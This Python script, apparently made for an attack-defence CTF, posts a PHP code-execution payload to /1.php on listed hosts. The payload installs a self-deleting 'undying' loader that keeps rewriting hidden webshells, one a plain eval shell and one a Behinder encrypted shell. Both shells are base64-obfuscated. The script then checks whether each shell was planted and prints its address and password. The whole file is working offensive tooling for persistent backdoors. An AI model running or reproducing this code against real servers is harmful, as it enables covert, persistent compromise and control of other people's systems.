import requests
ip = ["http://localhost", "http://192.168.239.129"]
url = "/1.php"
#普通shell shell.php 密码c
shell = "PD9waHAKaWdub3JlX3VzZXJfYWJvcnQodHJ1ZSk7CnNldF90aW1lX2xpbWl0KDApOwp1bmxpbmsoX19GSUxFX18pOwokZmlsZSA9ICdzaGVsbC5waHAnOwokY29kZSA9IGJhc2U2NF9kZWNvZGUoJ1BEOXdhSEFnWlhaaGJDZ2tYMUJQVTFSYlkxMHBPejgrJyk7CndoaWxlKHRydWUpIHsKICAgICBpZihtZDUoZmlsZV9nZXRfY29udGVudHMoJGZpbGUpKT09PW1kNSgkY29kZSkpewogICAgIH1lbHNlewogICAgICAgIGZpbGVfcHV0X2NvbnRlbnRzKCRmaWxlLCAkY29kZSk7CiAgICAgfQogICAgIHVzbGVlcCg1MDAwKTsKfQo/Pg=="
#冰蝎shell .fake.php
bxshell = "PD9waHAKaWdub3JlX3VzZXJfYWJvcnQodHJ1ZSk7CnNldF90aW1lX2xpbWl0KDApOwp1bmxpbmsoX19GSUxFX18pOwokZmlsZSA9ICcuZmFrZS5waHAnOwokY29kZSA9IGJhc2U2NF9kZWNvZGUoJ1BEOXdhSEFLUUdWeWNtOXlYM0psY0c5eWRHbHVaeWd3S1RzS2MyVnpjMmx2Ymw5emRHRnlkQ2dwT3dvZ0lDQWdKR3RsZVQwaVpUVTVNVFJoWmpGak0yTTJaVGMzTlNJN0Nna2tYMU5GVTFOSlQwNWJKMnNuWFQwa2EyVjVPd29KSkhCdmMzUTlabWxzWlY5blpYUmZZMjl1ZEdWdWRITW9JbkJvY0RvdkwybHVjSFYwSWlrN0NnbHBaaWdoWlhoMFpXNXphVzl1WDJ4dllXUmxaQ2duYjNCbGJuTnpiQ2NwS1FvSmV3b0pDU1IwUFNKaVlYTmxOalJmSWk0aVpHVmpiMlJsSWpzS0NRa2tjRzl6ZEQwa2RDZ2tjRzl6ZEM0aUlpazdDZ2tKQ2drSlptOXlLQ1JwUFRBN0pHazhjM1J5YkdWdUtDUndiM04wS1Rza2FTc3JLU0I3Q2lBZ0lDQUpDUWtnSkhCdmMzUmJKR2xkSUQwZ0pIQnZjM1JiSkdsZFhpUnJaWGxiSkdrck1TWXhOVjA3SUFvZ0lDQWdDUWtKZlFvSmZRb0paV3h6WlFvSmV3b0pDU1J3YjNOMFBXOXdaVzV6YzJ4ZlpHVmpjbmx3ZENna2NHOXpkQ3dnSWtGRlV6RXlPQ0lzSUNSclpYa3BPd29KZlFvZ0lDQWdKR0Z5Y2oxbGVIQnNiMlJsS0NkOEp5d2tjRzl6ZENrN0NpQWdJQ0FrWm5WdVl6MGtZWEp5V3pCZE93b2dJQ0FnSkhCaGNtRnRjejBrWVhKeVd6RmRPd29KWTJ4aGMzTWdRM3R3ZFdKc2FXTWdablZ1WTNScGIyNGdYMTlwYm5admEyVW9KSEFwSUh0bGRtRnNLQ1J3TGlJaUtUdDlmUW9nSUNBZ1FHTmhiR3hmZFhObGNsOW1kVzVqS0c1bGR5QkRLQ2tzSkhCaGNtRnRjeWs3Q2o4K0NnPT0nKTsKd2hpbGUodHJ1ZSkgewogICAgIGlmKG1kNShmaWxlX2dldF9jb250ZW50cygkZmlsZSkpPT09bWQ1KCRjb2RlKSl7CiAgICAgfWVsc2V7CiAgICAgICAgZmlsZV9wdXRfY29udGVudHMoJGZpbGUsICRjb2RlKTsKICAgICB9CiAgICAgdXNsZWVwKDUwMDApOwp9Cg=="
payload = 'fputs(fopen(".-Master.php","w"),base64_decode("'+bxshell+'"))'
payload2 = 'file_put_contents(".-Master.php", base64_decode("'+bxshell+'"))'

para = 'cmd='+payload

header = {
         "Content-Type": "application/x-www-form-urlencoded"
     }
for i in range(0, len(ip)):
    print("")
    print(ip[i])
    html = requests.post(ip[i] + url, headers=header, data=para)
    try:
        requests.get(ip[i] + "/.-Master.php", timeout=2)  # 运行不死马
    except requests.exceptions.ReadTimeout:
        print("不死马运行成功")
    shellpath = requests.get(ip[i] + "/.fake.php")
    if shellpath.status_code == 200:  # 判断免杀马是否存在
        print("[+][+][+][+][+][+][+][+][+][+][+]写入成功[+][+][+][+][+][+][+][+][+][+][+][+][+][+]")
        print("shell 地址：" + ip[i] + "/.fake.php 密码：hncst@")
    else:
        print("写入失败")

